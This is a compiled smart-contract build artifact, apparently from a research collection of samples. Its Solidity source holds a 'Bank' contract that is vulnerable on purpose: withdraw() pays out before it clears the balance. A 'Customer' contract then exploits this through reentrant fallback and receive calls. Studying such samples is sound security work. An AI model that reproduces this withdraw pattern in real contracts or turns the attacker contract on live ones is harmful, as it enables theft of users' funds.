{
  "contractName": "Bank",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "index",
          "type": "uint256"
        }
      ],
      "name": "deposit",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "withdraw",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b5061048e806100206000396000f3fe6080604052600436106100295760003560e01c80633ccfd60b1461002e578063b6b55f2514610038575b600080fd5b610036610054565b005b610052600480360381019061004d91906102af565b610188565b005b6000803373ffffffffffffffffffffffffffffffffffffffff166000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020546040516100b99061030d565b60006040518083038185875af1925050503d80600081146100f6576040519150601f19603f3d011682016040523d82523d6000602084013e6100fb565b606091505b509150915081610140576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016101379061037f565b60405180910390fd5b60008060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055505050565b60008190505b60008111156101ab576001816101a491906103ce565b905061018e565b6000803073ffffffffffffffffffffffffffffffffffffffff16346040516101d29061030d565b60006040518083038185875af1925050503d806000811461020f576040519150601f19603f3d011682016040523d82523d6000602084013e610214565b606091505b5091509150346000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282546102679190610402565b9250508190555050505050565b600080fd5b6000819050919050565b61028c81610279565b811461029757600080fd5b50565b6000813590506102a981610283565b92915050565b6000602082840312156102c5576102c4610274565b5b60006102d38482850161029a565b91505092915050565b600081905092915050565b50565b60006102f76000836102dc565b9150610302826102e7565b600082019050919050565b6000610318826102ea565b9150819050919050565b600082825260208201905092915050565b7f4661696c656420746f2073656e64204574686572000000000000000000000000600082015250565b6000610369601483610322565b915061037482610333565b602082019050919050565b600060208201905081810360008301526103988161035c565b9050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b60006103d982610279565b91506103e483610279565b9250828210156103f7576103f661039f565b5b828203905092915050565b600061040d82610279565b915061041883610279565b9250827fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff0382111561044d5761044c61039f565b5b82820190509291505056fea264697066735822122020fce841ee2a5f318fe7f318b99a955b03ae64f90f81d653bdbb656f86f5dadd64736f6c63430008090033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: GPL-3.0\npragma solidity >=0.4.2 <0.9.0;\n\ncontract Bank {\n    // A vulnerable bank smart contract.\n    mapping (address => uint256) balances;\n    \n    // This gives the amount/ether strored in the smart contract.\n    function deposit(uint256 index) public payable {\n        // Consumes a lot of gas.\n        // May fail the deposit call()\n        uint256 counter = index;\n        while (counter > 0) \n            counter -= 1;\n            \n        (bool sent, bytes memory data) = payable(address(this))\n                                    .call{value:msg.value}(\"\");\n        balances[msg.sender] += msg.value;\n    }\n    \n    // web3.utils.toWei('1', 'ether') else goes to fallback since\n    // arguments error.\n    function withdraw()\n        public\n        payable\n    {\n        (bool sent, bytes memory data) = msg.sender\n                           .call{value:balances[msg.sender]}(\"\");\n        require(sent, \"Failed to send Ether\");\n        balances[msg.sender] = 0;\n    }\n}\n\n\ncontract Customer {\n    uint256 counter = 0;\n    Bank public etherStore;\n\n    constructor(address _etherStoreAddress, uint256 counter) {\n        etherStore = Bank(_etherStoreAddress);\n        counter = counter;\n    }\n    \n        // Fallback is called when EtherStore sends Ether to this contract.\n    fallback() external payable {\n        if (address(etherStore).balance >= 1 ether) {\n            counter +=  1;\n            etherStore.withdraw();\n        }\n    }\n\n    // Fallback is called when EtherStore sends Ether to this contract.\n    receive() external payable {\n        if (address(etherStore).balance >= 1 ether) {\n            counter +=  1;\n            etherStore.withdraw();\n        }\n    }\n    \n    function simulate() external payable {\n        require(msg.value >= 1 ether, \"More than 1 ether needed\");\n        etherStore.deposit{value: 1 ether}(counter);\n        etherStore.withdraw();\n    }\n}",
  "sourcePath": "/home/clustfuzz/Documents/Research/Smart Contracts Project/Solidity-Examples/contract-samples/contracts/Example.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.9+commit.e5eed63a.Emscripten.clang"
  },
  "schemaVersion": "3.4.4",
  "updatedAt": "2022-01-31T04:40:04.172Z",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}